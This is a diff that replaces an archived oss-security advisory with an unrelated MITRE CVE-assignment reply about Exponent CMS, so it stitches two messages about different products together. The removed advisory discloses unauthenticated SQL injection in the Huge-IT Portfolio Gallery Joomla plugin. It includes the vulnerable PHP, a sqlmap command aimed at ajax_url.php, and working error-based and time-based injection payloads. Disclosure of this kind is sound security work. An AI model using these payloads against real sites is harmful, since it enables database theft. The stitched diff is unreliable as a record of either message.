@@ -1,51 +1,41 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/23/2
-Message-id: <02DB2C41-3186-45AD-9FC9-639FE9B256C0@me.com>
-Date: Fri, 23 Sep 2016 03:50:33 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: oss-security@...ts.openwall.com
-Subject: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/18/14
+Message-ID: <8352bc24d40a4601ad80e0bf3387f0bd@imshyb02.MITRE.ORG>
+Date: Fri, 18 Nov 2016 18:05:34 -0500
+From: <cve-assign@...re.org>
+To: <oss-security@...ts.openwall.com>
+CC: <cve-assign@...re.org>
+Subject: Re: CVE Request: Blind SQL Injection Vulnerability in Exponent CMS 2.4.0
 Content-Type: text/plain; charset=utf-8
 
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Title: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery Plugin v1.0.6
-Author: Larry W. Cashdollar, @_larry0
-Date: 2016-09-16
-Download Site: http://huge-it.com/joomla-portfolio-gallery/
-Vendor: huge-it.com, fixed v1.0.7
-Vendor Notified: 2016-09-17
-Vendor Contact: info@...e-it.com
-Description: Huge-IT Portfolio Gallery extension can do wonders with your website. If you wish to show your photos, videos, enclosing the additional images and videos, then this Portfolio Gallery extension is what you need.
-Vulnerability:
-The following lines allow unauthenticated users to perform SQL injection against the functions in ajax_url.php: In file ajax_url.php: 11 define('_JEXEC',1); 12 defined('_JEXEC') or die('Restircted access'); . . . 49 $page = $_POST["page"]; 50 $num=$_POST['perpage']; 51 $start = $page * $num - $num; 52 $idofgallery=$_POST['galleryid']; 53 $level = $_POST['level']; 54 $query = $db->getQuery(true); 55 $query->select('*'); 56 $query->from('#__huge_itportfolio_images'); 57 $query->where('portfolio_id ='.$idofgallery); 58 $query ->order('#__huge_itportfolio_images.ordering asc'); 59 $db->setQuery($query,$start,$num);
-CVE-2016-1000124
+> https://github.com/exponentcms/exponent-cms/commit/fffb2038de4c603931b785a4c3ec69cfd06181ba
 
-Exploit Code:
-$ sqlmap -u 'http://example.com/components/com_portfoliogallery/ajax_url.php' --data="page=1&galleryid=*&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2" --level=5 --risk=3
- 
- 
-(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
-sqlmap identified the following injection point(s) with a total of 2870 HTTP(s) requests:
----
-Parameter: #1* ((custom) POST)
- Type: error-based
- Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
- Payload: page=1&galleryid=-2264 OR 1 GROUP BY CONCAT(0x71716a7a71,(SELECT (CASE WHEN (3883=3883) THEN 1 ELSE 0 END)),0x7178627071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2
- 
- Type: AND/OR time-based blind
- Title: MySQL >= 5.0.12 time-based blind - Parameter replace
- Payload: page=1&galleryid=(CASE WHEN (9445=9445) THEN SLEEP(5) ELSE 9445 END)&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2
----
-[13:30:39] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian 8.0 (jessie)
-web application technology: Apache 2.4.10
-back-end DBMS: MySQL >= 5.0.12
-[13:30:39] [WARNING] HTTP error codes detected during run:
-500 (Internal Server Error) - 2715 times
-[13:30:39] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.4'
- 
-[*] shutting down at 13:30:39
+For completeness, we can mention that this was assigned CVE-2016-9272.
+(The discoverer used both oss-security and https://cveform.mitre.org
+to contact us about the same issue.)
 
-Advisory: http://www.vapidlabs.com/advisory.php?v=170
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-
+iQIcBAEBCAAGBQJYL4i7AAoJEHb/MwWLVhi2tWUQAJIYiYNLgoGa8OGxe+Uv7VpT
+FzRozJNTHJ8PDlLsBzMmHJ+Xew9nWqpZGabdkqwRi4QTUf3K64HBVRy5o0qho+Cm
+ej6FbydqbYJz7UHoj2IQuHlPSoHCfNpS9Crh8xEfC8vrntQf9tfCyWyeM7My8kY7
+AnqeM74rS/6UhYpOdZ/hdTNYXrzy8GiTC9W0cVh34JgeH/PKiJdxiJ5qsKPdsFDZ
+Z7tXz1uXby0T/hhacoLVlSQKq/IZoHyW9udYn/6edg/oPM4nVz48zcg2LSQU8jDR
+7IQUSNwPvHBLveQjXjvmUNx/GYSw5V5F4m+xy0egibb83TccF8oWerOgwwcRCnMx
+mALiuCBhaiW8s7gtOk5COWIHLdID+VKVU/oQswOmV3PHM/yPGa50JdjOOF5QJJru
+vFro8h6/vguI3ZEKDzaVhjpvU/B/d70WsCQFIkgyDet7spSX9ngFWM6fV9s5A5gv
+sQvZsOueHkW351urKasAT/OfM17LBaHZzmJxf/uVcCuUBKPOg/U2t7Kiy3xl20/P
+SCM+iRg3o9haIhHWsFKHW3Yz745OYq+jElRYmdFZRghJy1QZdmUdkXXTSb6RVmXZ
+BKbGveANdHpyLRLXS6yVSsnYmVKl4aYGHmQbSN/0n5H5x00zdzqveb65/tiMQF7V
+/nuVsQacfRvfDYsB2/ol
+=T1Cp
+-----END PGP SIGNATURE-----
